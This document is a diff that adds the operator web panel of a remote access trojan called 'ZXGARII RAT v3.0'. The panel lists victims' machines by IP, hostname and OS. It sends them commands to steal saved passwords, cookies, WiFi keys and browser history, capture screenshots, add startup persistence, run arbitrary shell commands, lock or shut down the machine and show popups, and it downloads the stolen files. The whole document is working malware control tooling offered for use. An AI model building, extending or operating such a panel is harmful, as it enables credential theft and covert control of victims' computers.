@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>ZXGARII RAT v3.0</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #c8c8c8;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            padding: 15px;
+            min-height: 100vh;
+            user-select: none;
+        }
+        .watermark {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 200px;
+            font-weight: 900;
+            color: transparent;
+            -webkit-text-stroke: 2px rgba(255,255,255,0.02);
+            letter-spacing: 15px;
+            pointer-events: none;
+            z-index: 0;
+            user-select: none;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 20px;
+            background: #111;
+            border: 1px solid #222;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .header h1 { font-size: 18px; font-weight: 300; letter-spacing: 3px; color: #e0e0e0; }
+        .header h1 span { color: #444; font-weight: 100; }
+        .header .stats { display: flex; gap: 20px; font-size: 12px; color: #666; }
+        .header .stats strong { color: #e0e0e0; font-weight: 400; }
+        
+        .main-container { display: flex; gap: 15px; position: relative; z-index: 1; min-height: 70vh; }
+        
+        .clients-panel {
+            width: 260px;
+            min-width: 200px;
+            background: #111;
+            border: 1px solid #222;
+            padding: 12px;
+            max-height: 70vh;
+            overflow-y: auto;
+        }
+        .clients-panel::-webkit-scrollbar { width: 3px; }
+        .clients-panel::-webkit-scrollbar-thumb { background: #444; }
+        .clients-panel h2 {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #555;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #222;
+            padding-bottom: 8px;
+        }
+        .client-item {
+            padding: 8px 10px;
+            cursor: pointer;
+            border-left: 2px solid transparent;
+            margin-bottom: 2px;
+            transition: 0.2s;
+        }
+        .client-item:hover { background: #1a1a1a; }
+        .client-item.active { border-left-color: #888; background: #181818; }
+        .client-item .name { font-size: 13px; color: #d0d0d0; }
+        .client-item .sub { font-size: 10px; color: #555; }
+        .client-item .status-dot { display: inline-block; width: 6px; height: 6px; border-radius: 50%; margin-right: 6px; }
+        .client-item .status-dot.online { background: #44ff88; }
+        .client-item .status-dot.offline { background: #ff4444; }
+        
+        .control-panel {
+            flex: 1;
+            background: #111;
+            border: 1px solid #222;
+            padding: 15px;
+            min-height: 400px;
+        }
+        
+        /* ============================================================
+           CAPTURE AREA CON REDIMENSIONAMIENTO
+           ============================================================ */
+        .capture-wrapper {
+            position: relative;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            margin-bottom: 15px;
+            min-height: 200px;
+            resize: both;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .capture-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: none;
+            pointer-events: none;
+        }
+        .capture-wrapper .placeholder {
+            color: #444;
+            font-size: 12px;
+            padding: 40px;
+            text-align: center;
+        }
+        .capture-wrapper .download-btn {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(34,34,34,0.85);
+            border: 1px solid #444;
+            color: #ccc;
+            padding: 4px 12px;
+            font-size: 10px;
+            cursor: pointer;
+            display: none;
+            z-index: 10;
+            backdrop-filter: blur(4px);
+        }
+        .capture-wrapper .download-btn:hover { background: #333; }
+        
+        /* === RESIZE HANDLE (ESQUINA INFERIOR DERECHA) === */
+        .resize-handle {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 20px;
+            height: 20px;
+            cursor: nw-resize;
+            z-index: 20;
+            opacity: 0.6;
+            transition: opacity 0.2s;
+        }
+        .resize-handle:hover {
+            opacity: 1;
+        }
+        .resize-handle::after {
+            content: "";
+            position: absolute;
+            bottom: 4px;
+            right: 4px;
+            width: 12px;
+            height: 12px;
+            border-right: 2px solid #888;
+            border-bottom: 2px solid #888;
+            transition: border-color 0.2s;
+        }
+        .resize-handle:hover::after {
+            border-color: #00d4ff;
+        }
+        
+        /* Info de tamaño de la captura */
+        .size-info {
+            position: absolute;
+            bottom: 35px;
+            right: 10px;
+            font-size: 9px;
+            color: #555;
+            background: rgba(0,0,0,0.7);
+            padding: 2px 8px;
+            border-radius: 3px;
+            display: none;
+            z-index: 10;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 0.5px;
+            pointer-events: none;
+        }
+        .size-info.show { display: block; }
+        
+        .category {
+            border-bottom: 1px solid #1a1a1a;
+        }
+        .category-header {
+            padding: 8px 0;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .category-header:hover { background: #181818; padding-left: 5px; }
+        .category-header .title { font-size: 12px; color: #b0b0b0; }
+        .category-header .arrow { transition: transform 0.3s; color: #444; font-size: 10px; }
+        .category-header .arrow.open { transform: rotate(180deg); }
+        
+        .category-body {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+            padding: 0 5px;
+        }
+        .category-body.open { max-height: 500px; padding: 5px 5px 12px 5px; }
+        
+        .sub-option {
+            display: inline-block;
+            padding: 4px 12px;
+            margin: 2px 4px 2px 0;
+            font-size: 11px;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            cursor: pointer;
+            transition: 0.2s;
+            color: #aaa;
+        }
+        .sub-option:hover { background: #2a2a2a; border-color: #555; color: #eee; }
+        .sub-option.download { border-color: #2a4a4a; color: #66ccff; }
+        .sub-option.download:hover { background: #1a3a3a; border-color: #66ccff; }
+        .sub-option.danger { border-color: #4a2a2a; color: #ff6666; }
+        .sub-option.danger:hover { background: #3a1a1a; border-color: #ff6666; }
+        .sub-option.success { border-color: #2a4a2a; color: #66ff88; }
+        .sub-option.success:hover { background: #1a3a1a; border-color: #66ff88; }
+        
+        .input-group {
+            display: flex;
+            gap: 4px;
+            margin-top: 6px;
+        }
+        .input-group input {
+            flex: 1;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            color: #ccc;
+            padding: 4px 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+        }
+        .input-group input:focus { outline: none; border-color: #555; }
+        .input-group button {
+            background: #222;
+            border: 1px solid #444;
+            color: #ccc;
+            padding: 4px 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            cursor: pointer;
+        }
+        .input-group button:hover { background: #333; }
+        
+        .results-list {
+            margin-top: 10px;
+            padding: 8px;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .results-list::-webkit-scrollbar { width: 3px; }
+        .results-list::-webkit-scrollbar-thumb { background: #444; }
+        .result-item {
+            padding: 4px 8px;
+            font-size: 11px;
+            color: #888;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #1a1a1a;
+        }
+        .result-item .dl-btn {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #66ccff;
+            padding: 2px 10px;
+            font-size: 9px;
+            cursor: pointer;
+        }
+        .result-item .dl-btn:hover { background: #2a2a2a; border-color: #66ccff; }
+        
+        .history-list {
+            margin-top: 10px;
+            padding: 6px 8px;
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            max-height: 100px;
+            overflow-y: auto;
+            font-size: 10px;
+            color: #555;
+        }
+        .history-list .entry { padding: 2px 0; border-bottom: 1px solid #111; }
+        .history-list .entry .cmd { color: #66ccff; }
+        .history-list .entry .time { color: #333; float: right; }
+        
+        @media (max-width: 900px) {
+            .main-container { flex-direction: column; }
+            .clients-panel { width: 100%; max-height: 150px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="watermark">RAT</div>
+
+<div class="header">
+    <h1>ZXGARII <span>// v3.0</span></h1>
+    <div class="stats">
+        <span>CLIENTS <strong id="totalClients">0</strong></span>
+        <span>CAPTURES <strong id="totalFrames">0</strong></span>
+        <span id="selectedDisplay" style="color:#555;">SELECT</span>
+    </div>
+</div>
+
+<div class="main-container">
+    <div class="clients-panel">
+        <h2>CLIENTS <span id="onlineCount">0 online</span></h2>
+        <div id="clientList"></div>
+    </div>
+    <div class="control-panel">
+        <!-- CAPTURE WRAPPER CON RESIZE -->
+        <div class="capture-wrapper" id="captureWrapper">
+            <img id="screenPreview" />
+            <div class="placeholder" id="placeholder">SELECT A CLIENT</div>
+            <button class="download-btn" id="downloadScreenshotBtn" onclick="downloadScreenshot()">⬇ DOWNLOAD</button>
+            <div class="size-info" id="sizeInfo">0×0</div>
+            <div class="resize-handle" id="resizeHandle"></div>
+        </div>
+        
+        <div id="categoriesContainer"></div>
+        <div id="resultsContainer" style="display:none;">
+            <div style="margin-top:10px;border-top:1px solid #222;padding-top:10px;">
+                <div style="font-size:10px;color:#555;margin-bottom:6px;letter-spacing:1px;text-transform:uppercase;">📁 RESULTS</div>
+                <div id="resultsList" class="results-list"></div>
+            </div>
+        </div>
+        <div id="historyContainer" style="display:none;">
+            <div style="margin-top:10px;border-top:1px solid #222;padding-top:10px;">
+                <div style="font-size:10px;color:#555;margin-bottom:6px;letter-spacing:1px;text-transform:uppercase;">📋 HISTORY</div>
+                <div id="historyList" class="history-list"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ============================================================
+// CONFIGURACIÓN
+// ============================================================
+let selectedClient = null;
+let clientsData = {};
+let frameInterval = null;
+let resultsData = [];
+let historyData = [];
+
+const CATEGORIES = {
+    'stealer': {
+        icon: '🕵️',
+        title: 'STEALER',
+        subs: [
+            { id: 'get_passwords', label: '🔑 Passwords', type: 'download' },
+            { id: 'get_cookies', label: '🍪 Cookies', type: 'download' },
+            { id: 'get_wifi', label: '📶 WiFi', type: 'download' },
+            { id: 'get_browser', label: '🌐 History', type: 'download' }
+        ]
+    },
+    'control': {
+        icon: '⚡',
+        title: 'CONTROL',
+        subs: [
+            { id: 'jump', label: '💀 Jumpscare' },
+            { id: 'lock', label: '🔒 Lock' },
+            { id: 'shutdown', label: '⏻ Shutdown', type: 'danger' },
+            { id: 'restart', label: '🔄 Restart', type: 'danger' },
+            { id: 'screenshot', label: '📸 Screenshot', type: 'success' }
+        ]
+    },
+    'system': {
+        icon: '📊',
+        title: 'SYSTEM',
+        subs: [
+            { id: 'sysinfo', label: '📋 Sysinfo', type: 'download' },
+            { id: 'processes', label: '📋 Processes', type: 'download' }
+        ]
+    },
+    'persistence': {
+        icon: '🔗',
+        title: 'PERSISTENCE',
+        subs: [
+            { id: 'add_startup', label: '📌 Add startup', type: 'success' },
+            { id: 'remove_startup', label: '❌ Remove startup', type: 'danger' }
+        ]
+    },
+    'terminal': {
+        icon: '⌨️',
+        title: 'TERMINAL',
+        subs: [
+            { id: 'exec_cmd', label: '▶️ Run command' }
+        ]
+    },
+    'notifications': {
+        icon: '🔔',
+        title: 'NOTIFICATIONS',
+        subs: [
+            { id: 'popup_msg', label: '💬 Send popup' }
+        ]
+    }
+};
+
+// ============================================================
+// RESIZE HANDLER
+// ============================================================
+(function initResize() {
+    const wrapper = document.getElementById('captureWrapper');
+    const handle = document.getElementById('resizeHandle');
+    const sizeInfo = document.getElementById('sizeInfo');
+    let isResizing = false;
+    let startX, startY, startWidth, startHeight;
+
+    handle.addEventListener('mousedown', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        isResizing = true;
+        startX = e.clientX;
+        startY = e.clientY;
+        startWidth = wrapper.offsetWidth;
+        startHeight = wrapper.offsetHeight;
+        wrapper.style.transition = 'none';
+        document.body.style.cursor = 'nw-resize';
+        sizeInfo.classList.add('show');
+    });
+
+    document.addEventListener('mousemove', function(e) {
+        if (!isResizing) return;
+        const dx = e.clientX - startX;
+        const dy = e.clientY - startY;
+        let newWidth = Math.max(150, startWidth + dx);
+        let newHeight = Math.max(100, startHeight + dy);
+        wrapper.style.width = newWidth + 'px';
+        wrapper.style.height = newHeight + 'px';
+        sizeInfo.textContent = newWidth + '×' + newHeight;
+    });
+
+    document.addEventListener('mouseup', function() {
+        if (isResizing) {
+            isResizing = false;
+            wrapper.style.transition = '';
+            document.body.style.cursor = '';
+            setTimeout(() => sizeInfo.classList.remove('show'), 1500);
+        }
+    });
+})();
+
+// ============================================================
+// FUNCIONES PRINCIPALES
+// ============================================================
+async function fetchClients() {
+    try {
+        const res = await fetch('/get_clients');
+        clientsData = await res.json();
+        renderClientList();
+        updateStats();
+    } catch (e) {}
+}
+
+async function fetchResults(clientId) {
+    if (!clientId) return;
+    try {
+        const res = await fetch(`/get_results/${clientId}`);
+        resultsData = await res.json();
+        renderResults();
+    } catch (e) {}
+}
+
+async function fetchHistory(clientId) {
+    if (!clientId) return;
+    try {
+        const res = await fetch(`/get_history/${clientId}`);
+        historyData = await res.json();
+        renderHistory();
+    } catch (e) {}
+}
+
+function renderResults() {
+    const container = document.getElementById('resultsContainer');
+    const list = document.getElementById('resultsList');
+    if (!resultsData || resultsData.length === 0) {
+        container.style.display = 'none';
+        return;
+    }
+    container.style.display = 'block';
+    list.innerHTML = resultsData.map((item, idx) => `
+        <div class="result-item">
+            <span>📄 ${item.filename}</span>
+            <button class="dl-btn" onclick="downloadResult(${idx})">⬇ DOWNLOAD</button>
+        </div>
+    `).join('');
+}
+
+function renderHistory() {
+    const container = document.getElementById('historyContainer');
+    const list = document.getElementById('historyList');
+    if (!historyData || historyData.length === 0) {
+        container.style.display = 'none';
+        return;
+    }
+    container.style.display = 'block';
+    list.innerHTML = historyData.map(item => `
+        <div class="entry">
+            <span class="cmd">${item.cmd}</span>
+            <span class="time">${new Date(item.time).toLocaleTimeString()}</span>
+        </div>
+    `).join('');
+}
+
+function renderClientList() {
+    const container = document.getElementById('clientList');
+    const ids = Object.keys(clientsData);
+    if (ids.length === 0) {
+        container.innerHTML = '<div style="color:#444;padding:20px;text-align:center;">No clients</div>';
+        return;
+    }
+    container.innerHTML = ids.map(id => {
+        const c = clientsData[id];
+        const active = selectedClient === id ? 'active' : '';
+        const statusClass = c.status === 'online' ? 'online' : 'offline';
+        return `
+            <div class="client-item ${active}" onclick="selectClient('${id}')">
+                <div class="name"><span class="status-dot ${statusClass}"></span>${c.hostname || id}</div>
+                <div class="sub">${c.ip} • ${c.os} • ${c.status}</div>
+            </div>
+        `;
+    }).join('');
+}
+
+function updateStats() {
+    const ids = Object.keys(clientsData);
+    document.getElementById('totalClients').textContent = ids.length;
+    const online = ids.filter(id => clientsData[id].status === 'online').length;
+    document.getElementById('onlineCount').textContent = online + ' online';
+    let totalFrames = 0;
+    ids.forEach(id => { totalFrames += clientsData[id].capture_count || 0; });
+    document.getElementById('totalFrames').textContent = totalFrames;
+}
+
+function selectClient(id) {
+    if (selectedClient === id) {
+        selectedClient = null;
+        document.getElementById('selectedDisplay').textContent = 'SELECT';
+        document.getElementById('screenPreview').style.display = 'none';
+        document.getElementById('placeholder').style.display = 'block';
+        document.getElementById('downloadScreenshotBtn').style.display = 'none';
+        if (frameInterval) clearInterval(frameInterval);
+        renderCategories();
+        document.getElementById('resultsContainer').style.display = 'none';
+        document.getElementById('historyContainer').style.display = 'none';
+        return;
+    }
+    selectedClient = id;
+    document.getElementById('selectedDisplay').textContent = clientsData[id]?.hostname || id;
+    renderCategories();
+    loadFrame(id);
+    fetchResults(id);
+    fetchHistory(id);
+    if (frameInterval) clearInterval(frameInterval);
+    frameInterval = setInterval(() => loadFrame(id), 3000);
+}
+
+async function loadFrame(clientId) {
+    try {
+        const res = await fetch('/get_captures/' + clientId);
+        const data = await res.json();
+        if (data && data.length > 0) {
+            const last = data[data.length - 1];
+            const img = document.getElementById('screenPreview');
+            img.src = 'data:image/png;base64,' + last.data;
+            img.style.display = 'block';
+            document.getElementById('placeholder').style.display = 'none';
+            document.getElementById('downloadScreenshotBtn').style.display = 'block';
+            document.getElementById('downloadScreenshotBtn').dataset.index = data.length - 1;
+        }
+    } catch (e) {}
+}
+
+function renderCategories() {
+    const container = document.getElementById('categoriesContainer');
+    if (!selectedClient) {
+        container.innerHTML = '<div style="color:#444;padding:40px;text-align:center;">Select a client</div>';
+        return;
+    }
+    container.innerHTML = Object.keys(CATEGORIES).map(key => {
+        const cat = CATEGORIES[key];
+        return `
+            <div class="category">
+                <div class="category-header" onclick="toggleCategory(this)">
+                    <span class="title"><span style="margin-right:8px;">${cat.icon}</span>${cat.title}</span>
+                    <span class="arrow">▼</span>
+                </div>
+                <div class="category-body">
+                    ${cat.subs.map(sub => `
+                        <span class="sub-option ${sub.type === 'download' ? 'download' : ''} ${sub.type === 'danger' ? 'danger' : ''} ${sub.type === 'success' ? 'success' : ''}" onclick="executeCommand('${sub.id}')">
+                            ${sub.label}
+                        </span>
+                    `).join('')}
+                    ${key === 'terminal' ? `
+                        <div class="input-group">
+                            <input type="text" id="terminalInput" placeholder="command" />
+                            <button onclick="execTerminal()">▶ RUN</button>
+                        </div>
+                    ` : ''}
+                    ${key === 'notifications' ? `
+                        <div class="input-group">
+                            <input type="text" id="popupInput" placeholder="popup message" />
+                            <button onclick="sendPopup()">📨 SEND</button>
+                        </div>
+                    ` : ''}
+                </div>
+            </div>
+        `;
+    }).join('');
+}
+
+function toggleCategory(header) {
+    const body = header.nextElementSibling;
+    const arrow = header.querySelector('.arrow');
+    if (body.classList.contains('open')) {
+        body.classList.remove('open');
+        arrow.classList.remove('open');
+    } else {
+        body.classList.add('open');
+        arrow.classList.add('open');
+    }
+}
+
+async function executeCommand(cmdId) {
+    if (!selectedClient) return alert('Select a client');
+    
+    const map = {
+        'get_passwords': 'steal_passwords',
+        'get_cookies': 'steal_cookies',
+        'get_wifi': 'steal_wifi',
+        'get_browser': 'steal_browser',
+        'jump': 'jump',
+        'lock': 'lock',
+        'shutdown': 'shutdown',
+        'restart': 'restart',
+        'screenshot': 'screenshot',
+        'sysinfo': 'sysinfo',
+        'processes': 'processes',
+        'add_startup': 'add_startup',
+        'remove_startup': 'remove_startup'
+    };
+    
+    const cmd = map[cmdId] || cmdId;
+    
+    try {
+        const res = await fetch('/send_cmd', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ client_id: selectedClient, cmd: cmd })
+        });
+        if (res.ok) {
+            const btn = event?.target;
+            if (btn) { 
+                const orig = btn.textContent; 
+                btn.textContent = '✓ SENT'; 
+                setTimeout(() => btn.textContent = orig, 1200);
+            }
+            if (['steal_passwords', 'steal_cookies', 'steal_wifi', 'steal_browser', 'sysinfo', 'processes'].includes(cmd)) {
+                setTimeout(() => fetchResults(selectedClient), 3000);
+            }
+            setTimeout(() => fetchHistory(selectedClient), 1000);
+        }
+    } catch (e) {}
+}
+
+function downloadResult(index) {
+    if (!selectedClient) return;
+    window.open(`/download_result/${selectedClient}/${index}`, '_blank');
+}
+
+function downloadScreenshot() {
+    const btn = document.getElementById('downloadScreenshotBtn');
+    const idx = btn.dataset.index;
+    if (!selectedClient || idx === undefined) return;
+    window.open(`/download_screenshot/${selectedClient}/${idx}`, '_blank');
+}
+
+function execTerminal() {
+    const input = document.getElementById('terminalInput');
+    if (!input || !input.value || !selectedClient) return alert('Select a client and enter a command');
+    fetch(`/exec_cmd/${selectedClient}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cmd: input.value })
+    }).then(() => {
+        input.value = '';
+        setTimeout(() => fetchHistory(selectedClient), 1000);
+    }).catch(console.error);
+}
+
+function sendPopup() {
+    const input = document.getElementById('popupInput');
+    if (!input || !input.value || !selectedClient) return alert('Select a client and enter a message');
+    fetch(`/notify/${selectedClient}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: input.value })
+    }).then(() => {
+        input.value = '';
+        setTimeout(() => fetchHistory(selectedClient), 1000);
+    }).catch(console.error);
+}
+
+document.addEventListener('keydown', (e) => {
+    if ((e.key === 'j' || e.key === 'J') && selectedClient) executeCommand('jump');
+    if ((e.key === 's' || e.key === 'S') && selectedClient) executeCommand('screenshot');
+});
+
+fetchClients();
+setInterval(fetchClients, 5000);
+renderCategories();
+
+setTimeout(() => {
+    const first = document.querySelector('.category-header');
+    if (first) toggleCategory(first);
+}, 500);
+
+console.log('ZXGARII RAT v3.0 - Con resize');
+</script>
+</body>
+</html>
